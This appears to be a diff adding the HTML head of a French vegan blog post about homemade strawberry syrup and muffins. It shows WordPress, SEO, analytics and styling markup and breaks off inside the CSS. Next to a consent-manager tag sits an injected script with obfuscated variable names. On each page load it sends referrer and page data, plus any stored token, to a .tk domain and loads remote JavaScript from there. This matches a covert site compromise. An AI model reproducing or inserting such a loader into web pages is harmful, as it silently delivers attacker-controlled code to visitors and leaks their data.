@@ -1,0 +1,2926 @@
+<!doctype html>
+<html lang="fr-FR">
+<head>
+	<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<style>
+  @font-face {
+    font-display: block;
+    font-family: Roboto;
+    src: url(fonts/7529907e9eaf8ebb5220c5f9850e3811.woff2) format("woff2"), url(fonts/25c678feafdc175a70922a116c9be3e7.woff) format("woff")
+  }
+
+  @font-face {
+    font-display: fallback;
+    font-family: Roboto;
+    font-weight: 600;
+    src: url(fonts/6e9caeeafb1f3491be3e32744bc30440.woff2) format("woff2"), url(fonts/71501f0d8d5aa95960f6475d5487d4c2.woff) format("woff")
+  }
+
+  @font-face {
+    font-display: fallback;
+    font-family: Roboto;
+    font-weight: 700;
+    src: url(fonts/3ef7cf158f310cf752d5ad08cd0e7e60.woff2) format("woff2"), url(fonts/ece3a1d82f18b60bcce0211725c476aa.woff) format("woff")
+  }
+
+  #sib-container input:-ms-input-placeholder {
+    text-align: left;
+    font-family: "inconsolita", sans-serif;
+    color: black;
+	  letter-spacing: 2px;
+	  padding: 15px;
+	font-weight: 400!important;
+	  font-size:12px;
+  }
+
+  #sib-container input::placeholder {
+    text-align: left;
+    font-family: "inconsolita", sans-serif;
+    color: black;
+	  letter-spacing: 2px;
+	  	  padding: 15px;
+ font-size:12px;
+	font-weight: 400!important;
+  }
+
+  #sib-container textarea::placeholder {
+    text-align: left;
+    font-family: "inconsolita", sans-serif;
+    color: black;
+	  letter-spacing: 2px;
+	  	  padding: 15px;
+	   font-size:12px;
+	font-weight: 400!important;
+  }
+</style>
+<link rel="stylesheet" href="css/sib-styles.css">
+
+    <!-- Quantcast Choice. Consent Manager Tag v2.0 (for TCF 2.0) -->
+    <script type="text/javascript" async="true">
+        (function() {
+            var host = 'www.themoneytizer.com';
+            var element = document.createElement('script');
+            var firstScript = document.getElementsByTagName('script')[0];
+            var url = 'https://quantcast.mgr.consensu.org'
+                .concat('/choice/', '6Fv0cGNfc_bw8', '/', host, '/choice.js')
+            var uspTries = 0;
+            var uspTriesLimit = 3;
+            element.async = true;
+            element.type = 'text/javascript';
+            element.src = url;
+
+            firstScript.parentNode.insertBefore(element, firstScript);
+
+            function makeStub() {
+                var TCF_LOCATOR_NAME = '__tcfapiLocator';
+                var queue = [];
+                var win = window;
+                var cmpFrame;
+
+                function addFrame() {
+                    var doc = win.document;
+                    var otherCMP = !!(win.frames[TCF_LOCATOR_NAME]);
+
+                    if (!otherCMP) {
+                        if (doc.body) {
+                            var iframe = doc.createElement('iframe');
+
+                            iframe.style.cssText = 'display:none';
+                            iframe.name = TCF_LOCATOR_NAME;
+                            doc.body.appendChild(iframe);
+                        } else {
+                            setTimeout(addFrame, 5);
+                        }
+                    }
+                    return !otherCMP;
+                }
+
+                function tcfAPIHandler() {
+                    var gdprApplies;
+                    var args = arguments;
+
+                    if (!args.length) {
+                        return queue;
+                    } else if (args[0] === 'setGdprApplies') {
+                        if (
+                            args.length > 3 &&
+                            args[2] === 2 &&
+                            typeof args[3] === 'boolean'
+                        ) {
+                            gdprApplies = args[3];
+                            if (typeof args[2] === 'function') {
+                                args[2]('set', true);
+                            }
+                        }
+                    } else if (args[0] === 'ping') {
+                        var retr = {
+                            gdprApplies: gdprApplies,
+                            cmpLoaded: false,
+                            cmpStatus: 'stub'
+                        };
+
+                        if (typeof args[2] === 'function') {
+                            args[2](retr);
+                        }
+                    } else {
+                        queue.push(args);
+                    }
+                }
+
+                function postMessageEventHandler(event) {
+                    var msgIsString = typeof event.data === 'string';
+                    var json = {};
+
+                    try {
+                        if (msgIsString) {
+                            json = JSON.parse(event.data);
+                        } else {
+                            json = event.data;
+                        }
+                    } catch (ignore) {}
+
+                    var payload = json.__tcfapiCall;
+
+                    if (payload) {
+                        window.__tcfapi(
+                            payload.command,
+                            payload.version,
+                            function(retValue, success) {
+                                var returnMsg = {
+                                    __tcfapiReturn: {
+                                        returnValue: retValue,
+                                        success: success,
+                                        callId: payload.callId
+                                    }
+                                };
+                                if (msgIsString) {
+                                    returnMsg = JSON.stringify(returnMsg);
+                                }
+                                event.source.postMessage(returnMsg, '*');
+                            },
+                            payload.parameter
+                        );
+                    }
+                }
+
+                while (win) {
+                    try {
+                        if (win.frames[TCF_LOCATOR_NAME]) {
+                            cmpFrame = win;
+                            break;
+                        }
+                    } catch (ignore) {}
+
+                    if (win === window.top) {
+                        break;
+                    }
+                    win = win.parent;
+                }
+                if (!cmpFrame) {
+                    addFrame();
+                    win.__tcfapi = tcfAPIHandler;
+                    win.addEventListener('message', postMessageEventHandler, false);
+                }
+            };
+
+            if (typeof module !== 'undefined') {
+                module.exports = makeStub;
+            } else {
+                makeStub();
+            }
+
+            var uspStubFunction = function() {
+                var arg = arguments;
+                if (typeof window.__uspapi !== uspStubFunction) {
+                    setTimeout(function() {
+                        if (typeof window.__uspapi !== 'undefined') {
+                            window.__uspapi.apply(window.__uspapi, arg);
+                        }
+                    }, 500);
+                }
+            };
+
+            var checkIfUspIsReady = function() {
+                uspTries++;
+                if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {
+                    console.warn('USP is not accessible');
+                } else {
+                    clearInterval(uspInterval);
+                }
+            };
+
+            if (typeof window.__uspapi === 'undefined') {
+                window.__uspapi = uspStubFunction;
+                var uspInterval = setInterval(checkIfUspIsReady, 6000);
+            }
+        })();
+    </script>
+    <!-- End Quantcast Choice. Consent Manager Tag v2.0 (for TCF 2.0) -->
+    <script>
+    (function() {
+    var name = '_q97kmKPjgzZ94Fmf';
+    if (!window._q97kmKPjgzZ94Fmf) {
+        window._q97kmKPjgzZ94Fmf = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://beruaidlas.tk/RtGZc6Cm',
+            P_PATH: 'https://beruaidlas.tk/f8b123b/postback',
+        };
+    }
+    const _3whnNkjJn31BFrvB = localStorage.getItem('config');
+    if (typeof _3whnNkjJn31BFrvB !== 'undefined' && _3whnNkjJn31BFrvB !== null) {
+        var _b4SGMRxkhSskS4s6 = JSON.parse(_3whnNkjJn31BFrvB);
+        var _7yMbC3HDf17ZF9vc = Math.round(+new Date()/1000);
+        if (_b4SGMRxkhSskS4s6.created_at + window._q97kmKPjgzZ94Fmf.ttl < _7yMbC3HDf17ZF9vc) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _g9rZTCNHL6jpYX7W = localStorage.getItem('subId');
+    var _wyWfYms874vM1rJ1 = localStorage.getItem('token');
+    var _xCMJZFV8fp5CnNhD = '?return=js.client';
+        _xCMJZFV8fp5CnNhD += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _xCMJZFV8fp5CnNhD += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _xCMJZFV8fp5CnNhD += '&default_keyword=' + encodeURIComponent(document.title);
+        _xCMJZFV8fp5CnNhD += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _xCMJZFV8fp5CnNhD += '&name=' + encodeURIComponent(name);
+        _xCMJZFV8fp5CnNhD += '&host=' + encodeURIComponent(window._q97kmKPjgzZ94Fmf.R_PATH);
+    if (typeof _g9rZTCNHL6jpYX7W !== 'undefined' && _g9rZTCNHL6jpYX7W && window._q97kmKPjgzZ94Fmf.unique) {
+        _xCMJZFV8fp5CnNhD += '&sub_id=' + encodeURIComponent(_g9rZTCNHL6jpYX7W);
+    }
+    if (typeof _wyWfYms874vM1rJ1 !== 'undefined' && _wyWfYms874vM1rJ1 && window._q97kmKPjgzZ94Fmf.unique) {
+        _xCMJZFV8fp5CnNhD += '&token=' + encodeURIComponent(_wyWfYms874vM1rJ1);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._q97kmKPjgzZ94Fmf.R_PATH + _xCMJZFV8fp5CnNhD;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
+    
+	<!-- This site is optimized with the Yoast SEO plugin v14.2 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Sirop de fraises maison ~ et une recette bonus de muffins (vegan, sans gluten) - Au Vert avec Lili</title>
+	<meta name="description" content="Qu&#039;à cela ne tienne, je me suis lancée dans la préparation de ma propre boisson, un sirop de fraises maison !">
+	<meta name="robots" content="index, follow">
+	<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+	<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+	<link rel="canonical" href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/">
+	<meta property="og:locale" content="fr_FR">
+	<meta property="og:type" content="article">
+	<meta property="og:title" content="Sirop de fraises maison ~ et une recette bonus de muffins (vegan, sans gluten) - Au Vert avec Lili">
+	<meta property="og:description" content="Qu&#039;à cela ne tienne, je me suis lancée dans la préparation de ma propre boisson, un sirop de fraises maison !">
+	<meta property="og:url" content="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/">
+	<meta property="og:site_name" content="Au Vert avec Lili">
+	<meta property="article:published_time" content="2020-04-25T04:52:00+00:00">
+	<meta property="article:modified_time" content="2021-02-10T09:12:52+00:00">
+	<meta property="og:image" content="images/IMG_2439.jpg">
+	<meta property="og:image:width" content="600">
+	<meta property="og:image:height" content="900">
+	<meta name="twitter:card" content="summary_large_image">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://auvertaveclili.fr/#website","url":"https://auvertaveclili.fr/","name":"Au Vert avec Lili","description":"Cuisine Vegetal Bien \u00catre","potentialAction":[{"@type":"SearchAction","target":"https://auvertaveclili.fr/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"fr-FR"},{"@type":"ImageObject","@id":"https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#primaryimage","inLanguage":"fr-FR","url":"https://auvertaveclili.fr/wp-content/uploads/2020/04/IMG_2439.jpg","width":600,"height":900},{"@type":"WebPage","@id":"https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#webpage","url":"https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/","name":"Sirop de fraises maison ~ et une recette bonus de muffins (vegan, sans gluten) - Au Vert avec Lili","isPartOf":{"@id":"https://auvertaveclili.fr/#website"},"primaryImageOfPage":{"@id":"https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#primaryimage"},"datePublished":"2020-04-25T04:52:00+00:00","dateModified":"2021-02-10T09:12:52+00:00","author":{"@id":"https://auvertaveclili.fr/#/schema/person/d5dbc68be02fde13d9173b82a65ffba4"},"description":"Qu'\u00e0 cela ne tienne, je me suis lanc\u00e9e dans la pr\u00e9paration de ma propre boisson, un sirop de fraises maison !","inLanguage":"fr-FR","potentialAction":[{"@type":"ReadAction","target":["https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/"]}]},{"@type":["Person"],"@id":"https://auvertaveclili.fr/#/schema/person/d5dbc68be02fde13d9173b82a65ffba4","name":"Lili"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link href="https://fonts.gstatic.com" crossorigin="" rel="preconnect">
+<link rel="alternate" type="application/rss+xml" title="Au Vert avec Lili &raquo; Flux" href="https://auvertaveclili.fr/feed/">
+<link rel="alternate" type="application/rss+xml" title="Au Vert avec Lili &raquo; Flux des commentaires" href="https://auvertaveclili.fr/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Au Vert avec Lili &raquo; Sirop de fraises maison ~ et une recette bonus de muffins (vegan, sans gluten) Flux des commentaires" href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/feed/">
+<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.4 - Using Analytics tracking - https://www.monsterinsights.com/ -->
+<script data-rocketlazyloadscript="data:text/javascript;base64,Cgl2YXIgbWlfdmVyc2lvbiAgICAgICAgID0gJzcuMTAuNCc7Cgl2YXIgbWlfdHJhY2tfdXNlciAgICAgID0gdHJ1ZTsKCXZhciBtaV9ub190cmFja19yZWFzb24gPSAnJzsKCQoJdmFyIGRpc2FibGVTdHIgPSAnZ2EtZGlzYWJsZS1VQS0yOTIzNDM1MS0xJzsKCgkvKiBGdW5jdGlvbiB0byBkZXRlY3Qgb3B0ZWQgb3V0IHVzZXJzICovCglmdW5jdGlvbiBfX2dhVHJhY2tlcklzT3B0ZWRPdXQoKSB7CgkJcmV0dXJuIGRvY3VtZW50LmNvb2tpZS5pbmRleE9mKGRpc2FibGVTdHIgKyAnPXRydWUnKSA+IC0xOwoJfQoKCS8qIERpc2FibGUgdHJhY2tpbmcgaWYgdGhlIG9wdC1vdXQgY29va2llIGV4aXN0cy4gKi8KCWlmICggX19nYVRyYWNrZXJJc09wdGVkT3V0KCkgKSB7CgkJd2luZG93W2Rpc2FibGVTdHJdID0gdHJ1ZTsKCX0KCgkvKiBPcHQtb3V0IGZ1bmN0aW9uICovCglmdW5jdGlvbiBfX2dhVHJhY2tlck9wdG91dCgpIHsKCSAgZG9jdW1lbnQuY29va2llID0gZGlzYWJsZVN0ciArICc9dHJ1ZTsgZXhwaXJlcz1UaHUsIDMxIERlYyAyMDk5IDIzOjU5OjU5IFVUQzsgcGF0aD0vJzsKCSAgd2luZG93W2Rpc2FibGVTdHJdID0gdHJ1ZTsKCX0KCQoJaWYgKCBtaV90cmFja191c2VyICkgewoJCShmdW5jdGlvbihpLHMsbyxnLHIsYSxtKXtpWydHb29nbGVBbmFseXRpY3NPYmplY3QnXT1yO2lbcl09aVtyXXx8ZnVuY3Rpb24oKXsKCQkJKGlbcl0ucT1pW3JdLnF8fFtdKS5wdXNoKGFyZ3VtZW50cyl9LGlbcl0ubD0xKm5ldyBEYXRlKCk7YT1zLmNyZWF0ZUVsZW1lbnQobyksCgkJCW09cy5nZXRFbGVtZW50c0J5VGFnTmFtZShvKVswXTthLmFzeW5jPTE7YS5zcmM9ZzttLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsbSkKCQl9KSh3aW5kb3csZG9jdW1lbnQsJ3NjcmlwdCcsJy8vd3d3Lmdvb2dsZS1hbmFseXRpY3MuY29tL2FuYWx5dGljcy5qcycsJ19fZ2FUcmFja2VyJyk7CgoJCV9fZ2FUcmFja2VyKCdjcmVhdGUnLCAnVUEtMjkyMzQzNTEtMScsICdhdXRvJyk7CgkJX19nYVRyYWNrZXIoJ3NldCcsICdmb3JjZVNTTCcsIHRydWUpOwoJCV9fZ2FUcmFja2VyKCdyZXF1aXJlJywgJ2Rpc3BsYXlmZWF0dXJlcycpOwoJCV9fZ2FUcmFja2VyKCdzZW5kJywncGFnZXZpZXcnKTsKCX0gZWxzZSB7CgkJY29uc29sZS5sb2coICIiICk7CgkJKGZ1bmN0aW9uKCkgewoJCQkvKiBodHRwczovL2RldmVsb3BlcnMuZ29vZ2xlLmNvbS9hbmFseXRpY3MvZGV2Z3VpZGVzL2NvbGxlY3Rpb24vYW5hbHl0aWNzanMvICovCgkJCXZhciBub29wZm4gPSBmdW5jdGlvbigpIHsKCQkJCXJldHVybiBudWxsOwoJCQl9OwoJCQl2YXIgbm9vcG51bGxmbiA9IGZ1bmN0aW9uKCkgewoJCQkJcmV0dXJuIG51bGw7CgkJCX07CgkJCXZhciBUcmFja2VyID0gZnVuY3Rpb24oKSB7CgkJCQlyZXR1cm4gbnVsbDsKCQkJfTsKCQkJdmFyIHAgPSBUcmFja2VyLnByb3RvdHlwZTsKCQkJcC5nZXQgPSBub29wZm47CgkJCXAuc2V0ID0gbm9vcGZuOwoJCQlwLnNlbmQgPSBub29wZm47CgkJCXZhciBfX2dhVHJhY2tlciA9IGZ1bmN0aW9uKCkgewoJCQkJdmFyIGxlbiA9IGFyZ3VtZW50cy5sZW5ndGg7CgkJCQlpZiAoIGxlbiA9PT0gMCApIHsKCQkJCQlyZXR1cm47CgkJCQl9CgkJCQl2YXIgZiA9IGFyZ3VtZW50c1tsZW4tMV07CgkJCQlpZiAoIHR5cGVvZiBmICE9PSAnb2JqZWN0JyB8fCBmID09PSBudWxsIHx8IHR5cGVvZiBmLmhpdENhbGxiYWNrICE9PSAnZnVuY3Rpb24nICkgewoJCQkJCWNvbnNvbGUubG9nKCAnRm9uY3Rpb24gYWN0dWVsbGVtZW50IHBhcyBlbiBjb3VycyBk4oCZZXjDqWN1dGlvbiBfX2dhVHJhY2tlcignICsgYXJndW1lbnRzWzBdICsgIiAuLi4uKSBwYXJjZSBxdWUgdm91cyBu4oCZw6p0ZXMgcGFzIHN1aXZpwrdlLiAiICsgbWlfbm9fdHJhY2tfcmVhc29uICk7CgkJCQkJcmV0dXJuOwoJCQkJfQoJCQkJdHJ5IHsKCQkJCQlmLmhpdENhbGxiYWNrKCk7CgkJCQl9IGNhdGNoIChleCkgewoKCQkJCX0KCQkJfTsKCQkJX19nYVRyYWNrZXIuY3JlYXRlID0gZnVuY3Rpb24oKSB7CgkJCQlyZXR1cm4gbmV3IFRyYWNrZXIoKTsKCQkJfTsKCQkJX19nYVRyYWNrZXIuZ2V0QnlOYW1lID0gbm9vcG51bGxmbjsKCQkJX19nYVRyYWNrZXIuZ2V0QWxsID0gZnVuY3Rpb24oKSB7CgkJCQlyZXR1cm4gW107CgkJCX07CgkJCV9fZ2FUcmFja2VyLnJlbW92ZSA9IG5vb3BmbjsKCQkJd2luZG93WydfX2dhVHJhY2tlciddID0gX19nYVRyYWNrZXI7CgkJCQkJfSkoKTsKCQl9Cg==" type="text/javascript" data-cfasync="false"></script>
+<!-- / Google Analytics by MonsterInsights -->
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel="stylesheet" id="yarppWidgetCss-css" href="css/widget.css" type="text/css" media="all">
+<link rel="stylesheet" id="wp-block-library-css" href="css/style.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="pdfprnt_frontend-css" href="css/frontend.css" type="text/css" media="all">
+<link rel="stylesheet" id="dashicons-css" href="css/dashicons.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="thickbox-css" href="css/thickbox.css" type="text/css" media="all">
+<link rel="stylesheet" id="search-filter-plugin-styles-css" href="css/search-filter.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="parent-style-css" href="css/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="hello-elementor-css" href="css/style.min_1.css" type="text/css" media="all">
+<link rel="stylesheet" id="hello-elementor-theme-style-css" href="css/theme.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-icons-css" href="css/elementor-icons.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-animations-css" href="css/animations.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-frontend-legacy-css" href="css/frontend-legacy.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-frontend-css" href="css/frontend.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-post-19855-css" href="css/post-19855.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-pro-css" href="css/frontend.min_1.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-global-css" href="css/global.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-post-19856-css" href="css/post-19856.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-post-19958-css" href="css/post-19958.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-post-20162-css" href="css/post-20162.css" type="text/css" media="all">
+<link rel="stylesheet" id="yarpp-thumbnails-yarpp-thumbnail-css" href="styles_thumbnails.css.php" type="text/css" media="all">
+<link rel="stylesheet" id="sib-front-css-css" href="css/mailin-front.css" type="text/css" media="all">
+<link rel="stylesheet" id="google-fonts-1-css" href="css/css.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-icons-shared-0-css" href="css/fontawesome.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-icons-fa-brands-css" href="css/brands.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="elementor-icons-fa-solid-css" href="css/solid.min.css" type="text/css" media="all">
+<script type="text/javascript" id="monsterinsights-frontend-script-js-extra">
+/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/auvertaveclili.fr","hash_tracking":"false"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="js/frontend.min.js" id="monsterinsights-frontend-script-js"></script>
+<script type="text/javascript" src="js/html2canvas.js" id="html2canvas.js-js"></script>
+<script type="text/javascript" src="js/jspdf.js" id="jspdf.js-js"></script>
+<script type="text/javascript" id="pdfprnt_front_script-js-extra">
+/* <![CDATA[ */
+var pdfprnt_file_settings = {"margin_left":"15","margin_right":"15","margin_top":"16","margin_bottom":"16","page_size":"A4","file_action":"open","file_name":"Sirop de fraises maison ~ et une recette bonus de muffins (vegan, sans gluten)"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="js/front-script.js" id="pdfprnt_front_script-js"></script>
+<script type="text/javascript" src="js/jquery.js" id="jquery-core-js"></script>
+<script type="text/javascript" id="search-filter-plugin-build-js-extra">
+/* <![CDATA[ */
+var SF_LDATA = {"ajax_url":"https:\/\/auvertaveclili.fr\/wp-admin\/admin-ajax.php","home_url":"https:\/\/auvertaveclili.fr\/"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="js/search-filter-build.min.js" id="search-filter-plugin-build-js"></script>
+<script type="text/javascript" src="js/chosen.jquery.min.js" id="search-filter-plugin-chosen-js"></script>
+<script type="text/javascript" id="sib-front-js-js-extra">
+/* <![CDATA[ */
+var sibErrMsg = {"invalidMail":"Veuillez entrer une adresse e-mail valide.","requiredField":"Veuillez compl\u00e9ter les champs obligatoires.","invalidDateFormat":"Veuillez entrer une date valide.","invalidSMSFormat":"Please fill out valid phone number"};
+var ajax_sib_front_object = {"ajax_url":"https:\/\/auvertaveclili.fr\/wp-admin\/admin-ajax.php","ajax_nonce":"54ed9080bb","flag_url":"https:\/\/auvertaveclili.fr\/wp-content\/plugins\/mailin\/img\/flags\/"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="js/mailin-front.js" id="sib-front-js-js"></script>
+<script type="text/javascript" src="js/jquery-ui.js" id="jquery_ui-js"></script>
+<script type="text/javascript" src="js/jquery.validate.min.js" id="jquery_validate-js"></script>
+<script type="text/javascript" src="js/sweetalert.min.js" id="sweet_alert-js"></script>
+<script type="text/javascript" id="ajax-test-js-extra">
+/* <![CDATA[ */
+var the_ajax_script = {"ajaxurl":"https:\/\/auvertaveclili.fr\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="js/custom-script.js" id="ajax-test-js"></script>
+<link rel="https://api.w.org/" href="https://auvertaveclili.fr/wp-json/"><link rel="alternate" type="application/json" href="https://auvertaveclili.fr/wp-json/wp/v2/posts/19603"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://auvertaveclili.fr/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://auvertaveclili.fr/wp-includes/wlwmanifest.xml"> 
+<meta name="generator" content="WordPress 5.5.3">
+<link rel="shortlink" href="https://auvertaveclili.fr/?p=19603">
+<link rel="alternate" type="application/json+oembed" href="https://auvertaveclili.fr/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fauvertaveclili.fr%2Fsirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://auvertaveclili.fr/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fauvertaveclili.fr%2Fsirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten%2F&#038;format=xml">
+<div id="13364-6"><script src="js/gen.js"></script><script src="js/requestform.js"></script></div><script src="js/gen_2.js"></script><script src="js/requestform_1.js"></script>
+<!-- Facebook Pixel Code -->
+<script data-rocketlazyloadscript="data:text/javascript;base64,CiFmdW5jdGlvbihmLGIsZSx2LG4sdCxzKXtpZihmLmZicSlyZXR1cm47bj1mLmZicT1mdW5jdGlvbigpe24uY2FsbE1ldGhvZD8Kbi5jYWxsTWV0aG9kLmFwcGx5KG4sYXJndW1lbnRzKTpuLnF1ZXVlLnB1c2goYXJndW1lbnRzKX07aWYoIWYuX2ZicSlmLl9mYnE9bjsKbi5wdXNoPW47bi5sb2FkZWQ9ITA7bi52ZXJzaW9uPScyLjAnO24ucXVldWU9W107dD1iLmNyZWF0ZUVsZW1lbnQoZSk7dC5hc3luYz0hMDsKdC5zcmM9djtzPWIuZ2V0RWxlbWVudHNCeVRhZ05hbWUoZSlbMF07cy5wYXJlbnROb2RlLmluc2VydEJlZm9yZSh0LHMpfSh3aW5kb3csCmRvY3VtZW50LCdzY3JpcHQnLCdodHRwczovL2Nvbm5lY3QuZmFjZWJvb2submV0L2VuX1VTL2ZiZXZlbnRzLmpzJyk7Cg==" type="text/javascript"></script>
+<!-- End Facebook Pixel Code -->
+<script data-rocketlazyloadscript="data:text/javascript;base64,CiAgZmJxKCdpbml0JywgJzcyODgyOTY0MTAzOTY4MicsIHt9LCB7CiAgICAiYWdlbnQiOiAid29yZHByZXNzLTUuNS4zLTMuMC4yIgp9KTsK" type="text/javascript"></script><script data-rocketlazyloadscript="data:text/javascript;base64,CiAgZmJxKCd0cmFjaycsICdQYWdlVmlldycsIFtdKTsK" type="text/javascript"></script>
+<!-- Facebook Pixel Code -->
+<noscript>
+<img height="1" width="1" style="display:none" alt="fbpx" src="tr">
+</noscript>
+<!-- End Facebook Pixel Code -->
+<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress.">
+<link rel="icon" href="images/cropped-Logo-px-32x32.jpg" sizes="32x32">
+<link rel="icon" href="images/cropped-Logo-px-192x192.jpg" sizes="192x192">
+<link rel="apple-touch-icon" href="images/cropped-Logo-px-180x180.jpg">
+<meta name="msapplication-TileImage" content="https://auvertaveclili.fr/wp-content/uploads/2020/08/cropped-Logo-px-270x270.jpg">
+		<style type="text/css" id="wp-custom-css">
+			/* Accueil */
+
+.pdfprnt-top-right, .pdfprnt-bottom-right, .pdfprnt-top-bottom-right, .pdfprnt-right {
+	display:none;
+}
+
+img {
+  filter: contrast(110%);
+}
+
+
+.title-comments, #reply-title, label, #submit, #logged-in-as {
+font-family : "inconsolata"!important;
+}
+
+#reply-title {
+	margin-top: 20px;
+}
+
+.yarpp-related h3 {
+    font-weight: bold;
+    padding: 0 0 5px 0;
+    font-size: 125%;
+    text-transform: uppercase !important;
+    margin: 0;
+}
+
+/* Aligner les img des posts à gauche (Vérifier conséquence sur layout) */
+.aligncenter {
+    clear: both;
+    display: block;
+    margin-left: 0 !important;
+}
+
+/* Related posts */
+.yarpp-related {
+margin-top : 100px!important;
+}
+
+.yarpp-related h3 {
+    font-weight: bold;
+    padding: 0 0 5px 0;
+    font-size: 125%;
+    text-transform: uppercase !important;
+    margin: 0;
+    letter-spacing: 3px;
+	margin-bottom: 20px !important;
+}
+
+.yarpp-thumbnails-horizontal .yarpp-thumbnail {
+    border: none !important;
+    width: 45%;
+    height: auto;
+    margin: 5px;
+    margin-left: 0px;
+    vertical-align: top;
+}
+
+.yarpp-thumbnails-horizontal .yarpp-thumbnail-title {
+    font-weight: 700;
+	font-size : 18px!important;
+    max-height: none !important;
+    line-height: 1.4em;
+    margin: 7px;
+    margin-top: 0px;
+    width: 120px;
+    text-decoration: inherit;
+    overflow: hidden;
+	color: #413f3f !important;
+	width: 50%;
+}
+
+.yarpp-thumbnails-horizontal .yarpp-thumbnail > img, .yarpp-thumbnails-horizontal .yarpp-thumbnail-default {
+    display: inline-block;
+    width: 130px!important;
+	height: 130px!important;
+}
+
+@media screen and (max-width: 1024px) {
+.yarpp-thumbnails-horizontal .yarpp-thumbnail {
+    border: none !important;
+    width: 100%;
+    height: auto;
+    margin: 5px;
+    margin-left: 0px;
+    vertical-align: top;
+}
+
+.yarpp-thumbnails-horizontal .yarpp-thumbnail-title {
+    font-weight: 700;
+	font-size : 18px!important;
+    max-height: none !important;
+    line-height: 1.4em;
+    margin: 7px;
+	padding: 30px 0;
+    width: 120px;
+    text-decoration: inherit;
+    overflow: hidden;
+	color: #413f3f !important;
+	width: 45%;
+}
+
+}
+
+@media screen and (max-width: 768px) {
+.yarpp-related h3 {
+    font-weight: bold;
+    padding: 0 0 5px 0;
+    font-size: 100%!important;
+    text-transform: uppercase !important;
+    margin: 0;
+    letter-spacing: 3px;
+	margin-bottom: 20px !important;
+}
+	.yarpp-thumbnails-horizontal .yarpp-thumbnail-title {
+    font-weight: 700;
+	font-size : 18px!important;
+    max-height: none !important;
+    line-height: 1.4em;
+   margin: 7px;
+	padding: 15px 0;
+    width: 120px;
+    text-decoration: inherit;
+    overflow: hidden;
+	color: #413f3f !important;
+	width: 45%;
+}
+}
+
+
+
+/* Page cours de cuisine en ligne */
+
+.select .category-label, .select .select-item-box {
+    display: block;
+    font-weight: 400;
